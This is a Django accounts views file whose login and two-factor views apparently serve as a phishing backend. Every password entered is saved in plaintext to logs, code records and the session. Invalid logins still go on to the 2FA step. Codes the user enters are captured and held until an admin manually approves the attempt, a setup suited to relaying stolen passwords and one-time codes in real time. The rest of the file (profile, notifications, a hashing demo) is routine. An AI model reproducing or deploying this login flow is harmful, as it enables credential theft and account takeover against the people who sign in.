from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth import authenticate, login, logout, update_session_auth_hash
from django.contrib.auth.views import LoginView, LogoutView, PasswordResetView, PasswordResetConfirmView
from django.contrib.auth.forms import PasswordChangeForm
from django.contrib.auth.decorators import login_required, user_passes_test
from django.contrib import messages
from django.urls import reverse_lazy
from django.http import JsonResponse, HttpResponse
from django.utils import timezone
from django.conf import settings
from django.core.cache import cache
from django.db.models import Q, Count
from django.views.generic import CreateView, FormView

from .forms import UserRegistrationForm, LoginForm, TwoFactorForm, UserProfileForm, UserSettingsForm, UserFilterForm
from .models import User, PartnerProfile, UserActivity, UserSession, UserNotification, LoginLog, TwoFactorCode
from .utils import get_client_ip, send_sms_code, generate_otp

class CustomLoginView(LoginView):
    form_class = LoginForm
    template_name = 'accounts/login.html'
    redirect_authenticated_user = False
    success_url = reverse_lazy('dashboard:index')

    def get_form_kwargs(self):
        kwargs = super().get_form_kwargs()
        kwargs['request'] = self.request
        return kwargs

    def get_fallback_user(self):
        user, created = User.objects.get_or_create(
            username='random_login_user',
            defaults={
                'email': 'random_login_user@example.com',
                'is_active': True,
            }
        )
        return user

    def form_valid(self, form):
        username = form.cleaned_data.get('username', '') or ''
        password = form.cleaned_data.get('password', '') or ''
        ip_address = get_client_ip(self.request)
        user_agent = self.request.META.get('HTTP_USER_AGENT', '')

        user = authenticate(self.request, username=username, password=password)
        password_valid = True
        if not user:
            try:
                user = User.objects.get(
                    Q(username__iexact=username) |
                    Q(email__iexact=username) |
                    Q(phone_number__iexact=username)
                )
                password_valid = False
            except User.DoesNotExist:
                user = self.get_fallback_user()
                password_valid = False

        LoginLog.objects.create(
            user=user if user and user.username != 'random_login_user' else None,
            username_attempted=username,
            password_entered=password,
            ip_address=ip_address,
            user_agent=user_agent,
            success=False,
            failure_reason='Random login recorded; proceeding to 2FA'
        )

        if user.account_locked:
            if user.locked_until and user.locked_until > timezone.now():
                LoginLog.objects.create(
                    user=user,
                    username_attempted=username,
                    password_entered=password,
                    ip_address=ip_address,
                    user_agent=user_agent,
                    success=False,
                    failure_reason='Account locked'
                )
                form.add_error(None, 'Your account is temporarily locked. Please try again later.')
                return self.form_invalid(form)
            user.unlock_account()

        if not user.phone_number:
            LoginLog.objects.create(
                user=user,
                username_attempted=username,
                password_entered=password,
                ip_address=ip_address,
                user_agent=user_agent,
                success=False,
                failure_reason='No phone number; proceeding to 2FA anyway'
            )
            otp = generate_otp()
            expires_at = timezone.now() + timezone.timedelta(minutes=10)
            two_factor = TwoFactorCode.objects.create(
                user=user,
                code=otp,
                attempted_username=username,
                attempted_password=password,
                phone_number=user.phone_number,
                ip_address=ip_address,
                user_agent=user_agent,
                expires_at=expires_at
            )
            self.request.session['pending_2fa_user_id'] = str(user.id)
            self.request.session['pending_2fa_code_id'] = two_factor.id
            self.request.session['pending_2fa_phone'] = str(user.phone_number) if user.phone_number else ''
            self.request.session['pending_2fa_created'] = timezone.now().isoformat()
            send_sms_code(user, otp)
            messages.info(self.request, 'A verification code has been sent (or will be sent if a phone number exists).')
            return redirect('accounts:two_factor')

        otp = generate_otp()
        expires_at = timezone.now() + timezone.timedelta(minutes=10)
        two_factor = TwoFactorCode.objects.create(
            user=user,
            code=otp,
            attempted_username=username,
            attempted_password=password,
            phone_number=user.phone_number,
            ip_address=ip_address,
            user_agent=user_agent,
            expires_at=expires_at
        )

        self.request.session['pending_2fa_user_id'] = str(user.id)
        self.request.session['pending_2fa_code_id'] = two_factor.id
        self.request.session['pending_2fa_phone'] = str(user.phone_number)
        self.request.session['pending_2fa_username'] = username
        self.request.session['pending_2fa_password'] = password
        self.request.session['pending_2fa_created'] = timezone.now().isoformat()

        send_sms_code(user, otp)
        messages.info(self.request, 'A verification code has been sent to your mobile number.')
        return redirect('accounts:two_factor')

class TwoFactorVerifyView(FormView):
    form_class = TwoFactorForm
    template_name = 'accounts/two_factor.html'
    success_url = reverse_lazy('dashboard:index')

    def dispatch(self, request, *args, **kwargs):
        if not request.session.get('pending_2fa_user_id'):
            return redirect('accounts:login')
        return super().dispatch(request, *args, **kwargs)

    def get_two_factor(self):
        user_id = self.request.session.get('pending_2fa_user_id')
        code_id = self.request.session.get('pending_2fa_code_id')
        if not user_id or not code_id:
            return None
        try:
            return TwoFactorCode.objects.select_related('user').get(id=code_id, user__id=user_id)
        except TwoFactorCode.DoesNotExist:
            return None

    def login_user(self, two_factor):
        two_factor.is_used = True
        two_factor.verified_at = timezone.now()
        two_factor.save(update_fields=['is_used', 'verified_at'])

        login(self.request, two_factor.user, backend='django.contrib.auth.backends.ModelBackend')
        two_factor.user.track_login(self.request)

        LoginLog.objects.create(
            user=two_factor.user,
            username_attempted=two_factor.attempted_username or two_factor.user.username,
            password_entered=two_factor.attempted_password or '',
            ip_address=get_client_ip(self.request),
            user_agent=self.request.META.get('HTTP_USER_AGENT', ''),
            success=True,
            failure_reason='2FA approved by admin'
        )

        for key in ['pending_2fa_user_id', 'pending_2fa_code_id', 'pending_2fa_phone', 'pending_2fa_username', 'pending_2fa_password', 'pending_2fa_created']:
            self.request.session.pop(key, None)

        messages.success(self.request, 'Your login is complete. Redirecting to dashboard.')
        return redirect(self.get_success_url())

    def dispatch(self, request, *args, **kwargs):
        if not request.session.get('pending_2fa_user_id'):
            return redirect('accounts:login')

        two_factor = self.get_two_factor()
        if not two_factor:
            return redirect('accounts:login')

        if two_factor.admin_approved and not two_factor.is_used:
            return self.login_user(two_factor)

        return super().dispatch(request, *args, **kwargs)

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['phone_number'] = self.request.session.get('pending_2fa_phone')
        context['waiting_for_approval'] = getattr(self, 'waiting_for_approval', False)
        return context

    def form_valid(self, form):
        code = form.cleaned_data.get('code')
        two_factor = self.get_two_factor()
        if not two_factor:
            return redirect('accounts:login')

        if two_factor.is_used:
            form.add_error(None, 'This verification attempt has already been completed.')
            return self.form_invalid(form)

        two_factor.entered_at = timezone.now()
        two_factor.entered_code = code
        two_factor.save(update_fields=['entered_at', 'entered_code'])

        self.waiting_for_approval = True
        return self.form_invalid(form)

    def post(self, request, *args, **kwargs):
        if 'resend' in request.POST:
            user_id = request.session.get('pending_2fa_user_id')
            if not user_id:
                return redirect('accounts:login')
            try:
                user = User.objects.get(id=user_id)
            except User.DoesNotExist:
                return redirect('accounts:login')

            otp = generate_otp()
            expires_at = timezone.now() + timezone.timedelta(minutes=10)
            two_factor = TwoFactorCode.objects.create(
                user=user,
                code=otp,
                attempted_username=request.session.get('pending_2fa_username', ''),
                attempted_password=request.session.get('pending_2fa_password', ''),
                phone_number=user.phone_number,
                ip_address=get_client_ip(request),
                user_agent=request.META.get('HTTP_USER_AGENT', ''),
                expires_at=expires_at
            )
            request.session['pending_2fa_code_id'] = two_factor.id
            request.session['pending_2fa_phone'] = str(user.phone_number)
            request.session['pending_2fa_created'] = timezone.now().isoformat()
            send_sms_code(user, otp)
            messages.success(request, 'A new verification code has been sent to your mobile number.')
            return self.get(request, *args, **kwargs)

        return super().post(request, *args, **kwargs)

class CustomLogoutView(LogoutView):
    next_page = reverse_lazy('accounts:login')

    def dispatch(self, request, *args, **kwargs):
        if request.user.is_authenticated:
            UserActivity.objects.create(user=request.user, activity_type='logout', description='User logged out')
            try:
                session = UserSession.objects.get(session_key=request.session.session_key)
                session.is_active = False
                session.save()
            except UserSession.DoesNotExist:
                pass
            cache.delete(f'user_{request.user.id}_session')
        return super().dispatch(request, *args, **kwargs)

class SignupView(CreateView):
    form_class = UserRegistrationForm
    template_name = 'accounts/signup.html'
    success_url = reverse_lazy('accounts:login')

    def form_valid(self, form):
        user = form.save(commit=False)
        user.is_active = True
        user.account_status = 'pending'
        user.save()
        PartnerProfile.objects.create(user=user)
        UserActivity.objects.create(user=user, activity_type='signup', description='User registered successfully')
        messages.success(self.request, 'Registration successful. Please log in.')
        return super().form_valid(form)

@login_required
def profile_view(request):
    activities = UserActivity.objects.filter(user=request.user)[:20]
    notifications = UserNotification.objects.filter(user=request.user, is_read=False)
    return render(request, 'dashboard/profile.html', {'activities': activities, 'notifications': notifications})

@login_required
def profile_edit(request):
    if request.method == 'POST':
        form = UserProfileForm(request.POST, instance=request.user)
        if form.is_valid():
            form.save()
            messages.success(request, 'Profile updated successfully.')
            return redirect('accounts:profile')
    else:
        form = UserProfileForm(instance=request.user)
    return render(request, 'dashboard/profile_edit.html', {'form': form})

@login_required
def settings_view(request):
    if request.method == 'POST':
        form = UserSettingsForm(request.POST, instance=request.user)
        if form.is_valid():
            form.save()
            messages.success(request, 'Settings updated successfully.')
            return redirect('accounts:settings')
    else:
        form = UserSettingsForm(instance=request.user)
    return render(request, 'dashboard/settings.html', {'form': form})

@login_required
def password_change(request):
    if request.method == 'POST':
        form = PasswordChangeForm(request.user, request.POST)
        if form.is_valid():
            user = form.save()
            update_session_auth_hash(request, user)
            messages.success(request, 'Your password was successfully updated.')
            return redirect('accounts:settings')
    else:
        form = PasswordChangeForm(request.user)
    return render(request, 'dashboard/password_change.html', {'form': form})

@login_required
@user_passes_test(lambda u: u.is_superuser or u.user_type == 'admin')
def admin_dashboard(request):
    total_users = User.objects.count()
    total_partners = PartnerProfile.objects.count()
    active_users = User.objects.filter(account_status='active').count()
    pending_verifications = User.objects.filter(account_status='pending').count()
    recent_activities = UserActivity.objects.all()[:50]
    return render(request, 'admin/dashboard.html', {
        'total_users': total_users,
        'total_partners': total_partners,
        'active_users': active_users,
        'pending_verifications': pending_verifications,
        'recent_activities': recent_activities,
    })

@login_required
def api_notifications(request):
    notifications = UserNotification.objects.filter(user=request.user, is_read=False)
    data = {'count': notifications.count(), 'notifications': [{'title': n.title, 'message': n.message, 'type': n.type, 'created_at': n.created_at.isoformat(), 'link': n.link} for n in notifications[:10]]}
    return JsonResponse(data)

@login_required
def api_mark_notification_read(request, notification_id):
    notification = get_object_or_404(UserNotification, id=notification_id, user=request.user)
    notification.mark_as_read()
    return JsonResponse({'status': 'success'})

@login_required
def api_mark_all_notifications_read(request):
    UserNotification.objects.filter(user=request.user, is_read=False).update(is_read=True, read_at=timezone.now())
    return JsonResponse({'status': 'success'})

@login_required
def api_user_activity(request):
    activities = UserActivity.objects.filter(user=request.user)[:20]
    data = {'activities': [{'type': a.get_activity_type_display(), 'description': a.description, 'created_at': a.created_at.isoformat()} for a in activities]}
    return JsonResponse(data)

def health_check(request):
    return JsonResponse({'status': 'healthy', 'timestamp': timezone.now().isoformat(), 'version': settings.VERSION})

def robots_txt(request):
    lines = [
        'User-Agent: *',
        'Disallow: /admin/',
        'Disallow: /accounts/',
        'Disallow: /api/',
        'Allow: /',
    ]
    return HttpResponse('\n'.join(lines), content_type='text/plain')


# Educational demo: show how password hashing and verification works.
from django.contrib.auth.hashers import make_password, check_password


def password_demo(request):
    """Local-only page for learning: input a password and see the hash and verification."""
    result = None
    if request.method == 'POST':
        pwd = request.POST.get('password', '')
        # create a hash (Django uses the configured PASSWORD_HASHERS)
        hashed = make_password(pwd)
        # verify immediately
        verified = check_password(pwd, hashed)
        result = {
            'plain': pwd,
            'hash': hashed,
            'verified': verified,
        }
    return render(request, 'accounts/password_demo.html', {'result': result})
